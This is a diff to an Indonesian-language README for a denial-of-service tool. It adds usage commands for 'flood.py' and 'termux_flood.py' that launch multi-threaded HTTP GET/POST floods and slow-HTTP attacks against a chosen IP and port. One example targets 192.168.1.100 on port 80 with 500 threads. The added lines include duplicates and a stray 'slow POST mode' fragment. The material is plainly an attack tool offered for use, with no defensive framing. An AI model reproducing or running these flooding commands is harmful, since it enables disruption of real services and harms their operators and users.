@@ -51,4 +51,13 @@ Jalankan script dari direktori tempat Anda menyimpannya menggunakan `python` di 
 
 ```bash
 python flood.py <TARGET_IP> <TARGET_PORT> <THREADS> <ATTACK_TYPE> [HTTP_METHOD]
+python flood.py <IP> <PORT> <THREADS_PER_PORT> http normal GET
+# Atau POST
+python flood.py <IP> <PORT> <THREADS_PER_PORT> http normal POST
+python flood.py 192.168.1.100 80 500 http normal GET
+python termux_flood.py <IP> <PORT> <THREADS_PER_PORT> http slow
 
+python flood.py <IP> <PORT> <THREADS_PER_PORT> http slow
+python termux_flood.py <IP> <PORT> <THREADS_PER_PORT> http slow
+slow POST mode
+python flood.py <IP> <PORT> <THREADS_PER_PORT> http slow POST
